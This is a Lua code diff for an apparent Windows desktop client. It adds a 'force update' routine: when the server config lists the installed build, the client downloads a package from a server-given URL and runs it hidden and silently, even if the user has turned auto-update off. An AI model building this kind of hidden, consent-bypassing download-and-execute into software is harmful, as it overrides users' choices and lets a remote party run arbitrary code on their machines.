@@ -111,11 +111,11 @@ function Inner_ChangeSwitchFilter(objFilterSwitch)
 	if g_bFilterOpen then
 		objFilterSwitch:SetTextureID("GreenWall.SwitchFilter.Close")
 		g_bFilterOpen = false
-		tipUtil:GSFilter(false)
+		tFunctionHelper.SwitchGSFilter(false)
 	else
 		objFilterSwitch:SetTextureID("GreenWall.SwitchFilter.Open")
 		g_bFilterOpen = true
-		tipUtil:GSFilter(true)
+		tFunctionHelper.SwitchGSFilter(true)
 	end
 end
 
@@ -276,39 +276,6 @@ function SendReport(tStatInfo)
 end
 
 
---每天自动检查更新
-function CheckUpdateVersion()
-	local tUserCfg = tFunctionHelper.GetUserConfigFromMem() or {}
-	local bState = FetchValueByPath(tUserCfg, {"tConfig", "AutoUpdate", "bState"}) or false
-	if not bState then
-		return
-	end
-	
-	function TryShowUpdateWnd(bRet, strCfgPath)
-		if bRet ~= 0 or not tipUtil:QueryFileExists(strCfgPath) then
-			return
-		end
-		
-		local tServerConfig = tFunctionHelper.LoadTableFromFile(strCfgPath) or {}
-		local tNewVersionInfo = tServerConfig["tNewVersionInfo"]
-		if(type(tNewVersionInfo)) ~= "table" then
-			return 
-		end
-		
-		local strCurVersion = tFunctionHelper.GetGSVersion()
-		local strNewVersion = tNewVersionInfo.strVersion		
-		
-		if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
-			or not tFunctionHelper.CheckIsNewVersion(strNewVersion, strCurVersion) then
-			return
-		end
-		
-		DownLoadNewVersion(tNewVersionInfo)
-	end	
-	
-	tFunctionHelper.DownLoadServerConfig(TryShowUpdateWnd)
-end
-
 --隔天将disable状态的video设置为可弹窗
 function InitVideoState()
 	TipLog("[InitVideoState] enter")
@@ -326,7 +293,69 @@ function InitVideoState()
 end
 
 
-function DownLoadNewVersion(tNewVersionInfo)
+
+--每天自动检查更新
+function CheckUpdateVersion()
+	tFunctionHelper.DownLoadServerConfig(CheckForceUpdate)
+end
+
+--强制更新
+function CheckForceUpdate(bRet, strCfgPath)
+	if bRet ~= 0 or not tipUtil:QueryFileExists(strCfgPath) then
+		return
+	end
+	
+	local tServerConfig = tFunctionHelper.LoadTableFromFile(strCfgPath) or {}
+	local tNewVersionInfo = tServerConfig["tNewVersionInfo"]
+	if type(tNewVersionInfo) ~= "table" then
+		return
+	end	
+	
+	local tForceUpdate = tNewVersionInfo["tForceUpdate"]
+	if(type(tForceUpdate)) ~= "table" then
+		TryShowUpdateWnd(tNewVersionInfo)
+		return 
+	end
+
+	local tVersion = tForceUpdate["tVersion"]
+	local bPassCheck = CheckForceVersion(tVersion)
+	TipLog("[CheckForceUpdate] CheckForceVersion bPassCheck:"..tostring(bPassCheck))
+	if not bPassCheck then
+		TryShowUpdateWnd(tNewVersionInfo)
+		return 
+	end
+	
+	DownLoadNewVersion(tNewVersionInfo, function(strRealPath) 
+		if not IsRealString(strRealPath) then
+			return
+		end
+		
+		local strCmd = " /write /silent /run"
+		tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
+	end)
+end
+
+
+function TryShowUpdateWnd(tNewVersionInfo)
+	local tUserCfg = tFunctionHelper.GetUserConfigFromMem() or {}
+	local bState = FetchValueByPath(tUserCfg, {"tConfig", "AutoUpdate", "bState"}) or false
+	if not bState then
+		return
+	end
+	
+	local strCurVersion = tFunctionHelper.GetGSVersion()
+	local strNewVersion = tNewVersionInfo.strVersion		
+	
+	if not IsRealString(strCurVersion) or not IsRealString(strNewVersion)
+		or not tFunctionHelper.CheckIsNewVersion(strNewVersion, strCurVersion) then
+		return
+	end
+	
+	DownLoadNewVersion(tNewVersionInfo, PopupUpdateWndForInstall)
+end	
+
+
+function DownLoadNewVersion(tNewVersionInfo, fnCallBack)
 	local strPacketURL = tNewVersionInfo.strPacketURL
 	if not IsRealString(strPacketURL) then
 		return
@@ -345,10 +374,11 @@ function DownLoadNewVersion(tNewVersionInfo)
 		        .."  bRet:"..tostring(bRet).."  strRealPath:"..tostring(strRealPath))
 				
 		if 0 == bRet then
-			PopupUpdateWndForInstall(strRealPath, tNewVersionInfo)
+			fnCallBack(strRealPath, tNewVersionInfo)
 		end
 	end)	
 end
+
 
 function PopupUpdateWndForInstall(strRealPath, tNewVersionInfo)
 	if not IsRealString(strRealPath) then
@@ -370,6 +400,41 @@ function PopupUpdateWndForInstall(strRealPath, tNewVersionInfo)
 	end
 end
 
+
+function CheckForceVersion(tForceVersion)
+	if type(tForceVersion) ~= "table" then
+		return false
+	end
+
+	local bRightVer = false
+	
+	local strCurVersion = tFunctionHelper.GetGSVersion()
+	local _, _, _, _, _, strCurVersion_4 = string.find(strCurVersion, "(%d+)%.(%d+)%.(%d+)%.(%d+)")
+	local nCurVersion_4 = tonumber(strCurVersion_4)
+	if type(nCurVersion_4) ~= "number" then
+		return bRightVer
+	end
+	for iIndex = 1, #tForceVersion do
+		local strRange = tForceVersion[iIndex]
+		local iPos = string.find(strRange, "-")
+		if iPos ~= nil then
+			local lVer = tonumber(string.sub(strRange, 1, iPos - 1))
+			local hVer = tonumber(string.sub(strRange, iPos + 1))
+			if lVer ~= nil and hVer ~= nil and nCurVersion_4 >= lVer and nCurVersion_4 <= hVer then
+				bRightVer = true
+				break
+			end
+		else
+			local verFlag = tonumber(strRange)
+			if verFlag ~= nil and nCurVersion_4 == verFlag then
+				bRightVer = true
+				break
+			end
+		end
+	end
+	
+	return bRightVer
+end
 
 ----------------------------------
 
